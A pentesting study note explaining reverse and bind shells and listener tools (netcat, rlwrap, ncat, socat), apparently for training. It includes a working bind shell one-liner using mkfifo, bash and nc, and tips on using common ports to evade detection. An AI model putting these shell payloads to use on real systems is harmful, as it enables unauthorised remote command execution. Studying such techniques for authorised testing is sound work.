# Shells

## Reverse Shell
- reverse shells initiate from the target machine back to the attacker machine. This can help avoid IDS and bypass firewalls since the connection is coming from and not to the machine. 
- you need to set up a listener for these.
- reverse shells connect back to the listener and you interact with it from there.
- **Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like 53, 80, 8080, 443, 139, or 445.** This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.
- [Reverse shell payloads cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- You need to set up a nc listener with `nc -nvlp TARGET_IP PORT`



## Bind Shell
- A bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely. This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.
- Bind shell example payload: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f`
- We need to note that ports below **1024** will require Netcat to be executed with elevated privileges. In this case, using port 8080 will avoid this.
- You need to set up a nc listener with: `nc -nv TARGET_IP 8080`


### Listeners

Netcat is just one listener you can use. 

**rlwrap**

It is a small utility that uses the GNU readline library to provide editing keyboard and history.

`rlwrap nc -nvlp 443`

- This wraps nc with rlwrap, allowing the use of features like arrow keys and history for better interaction.
<hr />

**Ncat**

Ncat is an improved version of Netcat distributed by the NMAP project. It provides extra features, like encryption (SSL).
`ncat -lvnp 4444`
`ncat --ssl -lvnp 4444`
- Two examples, with one enabling SSL encryption

<hr />

**Socat**

Socat is a utility that allows you to create a socket connection between two data sources, in this case, two different hosts.

`socat -d -d TCP-LISTEN:443 STDOUT`

- The command above used the -d option to enable verbose output; using it again (-d -d) will increase the verbosity of the commands. The TCP-LISTEN:443 option creates a TCP listener on port 443, establishing a server socket for incoming connections. Finally, the STDOUT option directs any incoming data to the terminal.
